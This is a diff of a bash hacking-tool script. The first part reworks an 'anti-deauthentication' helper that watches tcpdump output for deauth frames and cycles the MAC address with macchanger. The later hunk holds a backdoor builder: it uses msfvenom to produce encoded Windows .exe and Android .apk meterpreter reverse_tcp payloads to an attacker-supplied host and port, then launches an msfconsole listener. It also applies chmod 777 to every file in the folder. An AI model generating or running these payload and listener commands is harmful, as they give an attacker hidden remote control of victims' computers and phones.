@@ -798,37 +798,30 @@ echo INTERFACE USED
 echo
 echo
 read -p 'interface : ' interfacepda
-echo "
- $interfacepda" > gstoorrrrrr.txt
+
+ 
 
 
 
 
 echo "\
-
 #!/bin/bash
 
-
-xterm -e tcpdump -i $interfacepda | grep DeAuthentication > deauth.txt
+rm -rf deauth.txt
+xterm -e 'tcpdump -i $interfacepda | grep DeAuthentication > deauth.txt' &
 rm -rf patchdeauth.sh
 rm -rf macchanger.txt 
+le='2'
 
 
 
-if [ scan12 -eq 1 ]
-then
-xterm -e tcpdump -i $interfacepda | grep DeAuthentication > deauth.txt
-fi
-
-
-
-while [test]
+for i in {1..99999}
 do
-      sleep 0.5
-      line=$ (wc -l < deauth.txt)
-      sleep 0.769
+      sleep 10
+      line=$(wc -l < deauth.txt)
+      sleep 7.99
 
-           if [ '$line' => 2 ]
+           if [ $"line" -ge $"le" ]
            then
 
 
@@ -836,18 +829,27 @@ do
 
 
 
-           echo '
+            echo '
                  #!/bin/bash 
                  clear
                  while [ mac ]
                  do
+                 sleep 5
+                 echo -e '\e[1;34m '
+                 echo ------------------------------------------
+                 echo -   DeAuthentication AtTaCk PROTECTION   -
+                 echo ------------------------------------------
+                 ifconfig $interfacepda down
+                 echo
+                 echo
+                 echo
+                 echo ----------------------------------
                  macchanger -a $interfacepda  >> macchanger.txt
-                 echo
-                 echo ----------------------------------
-                 tac macchanger.txt | grep New
                  echo ----------------------------------
                  echo
-                 sleep 25
+                 echo
+                 echo
+                 sleep 30
                  done ' > patchdeauth.sh
                  chmod 777 *
 
@@ -856,16 +858,22 @@ do
 
 
 
-           sudo xterm -title alerte-deauth-attack -e ./patchdeauth.sh
+            sudo xterm -title ALERTE-deauth-attack -e ./patchdeauth.sh
+            
+
+
+
            
 
 
-           fi
+            fi
+
+
+      sleep 16.99
 
 
 
-
-done /" > antideauth.sh
+done " > antideauth.sh
 
 
 
@@ -913,28 +921,28 @@ read -p 'name : ' namebd
 
       if [ $osbd = "windows" ] 
       then
-      msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd -e x86/shikata_ga_nai -i 11 lport=$portbd --platform windows -f exe -a x86 > $namebd.exe
-      echo
-      echo
-      echo
-      echo listening on $hostbd : $portbd
-      echo
-      echo
-      echo
-      msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $hostbd ; set lport $portbd ; exploit ; "
+        msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd -e x86/shikata_ga_nai -i 11 lport=$portbd --platform windows -f exe -a x86 > $namebd.exe
+        echo
+        echo
+        echo
+        echo listening on $hostbd : $portbd
+        echo
+        echo
+        echo
+        msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $hostbd ; set lport $portbd ; exploit ; "
       fi
 
       if [ $osbd = "android" ]
       then
-      msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd lport=$portbd > $namebd.apk
-      echo
-      echo
-      echo
-      echo listening on $hostbd : $portbd
-      echo
-      echo
-      echo
-      msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $hostbd ; set lport $portbd ; exploit ; "
+        msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd lport=$portbd > $namebd.apk
+        echo
+        echo
+        echo
+        echo listening on $hostbd : $portbd
+        echo
+        echo
+        echo
+        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $hostbd ; set lport $portbd ; exploit ; "
       fi
 
 
